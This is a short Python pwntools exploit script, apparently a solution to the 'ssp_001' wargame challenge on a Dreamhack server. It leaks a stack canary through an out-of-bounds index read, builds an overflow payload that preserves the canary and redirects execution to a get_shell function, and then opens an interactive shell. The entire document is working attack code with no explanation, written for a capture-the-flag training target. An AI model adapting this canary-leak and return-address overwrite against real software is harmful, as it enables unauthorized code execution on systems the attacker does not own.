from pwn import *
context.log_level = 'debug'
#p = process('./ssp_001')
p = remote('host3.dreamhack.games', 16116)
elf = ELF('./ssp_001')
p.recvuntil(b'> ')
canary = '0x'
i = 131
while i >= 128:
    p.sendline(b'P')
    p.recvuntil(b' index : ')
    p.sendline(str(i).encode())
    p.recvuntil(b' : ')
    canary += p.recvuntil(b'\n').decode()[:-1]
    i -= 1
print(canary)

payload = b'a' * 64 + p32(int(canary, 16)) + b'a' * 8 + p32(elf.symbols['get_shell'])
p.sendline(b'E')
p.sendlineafter(b'Size : ', str(len(payload)).encode())
p.sendafter(b'Name : ', payload)
p.interactive()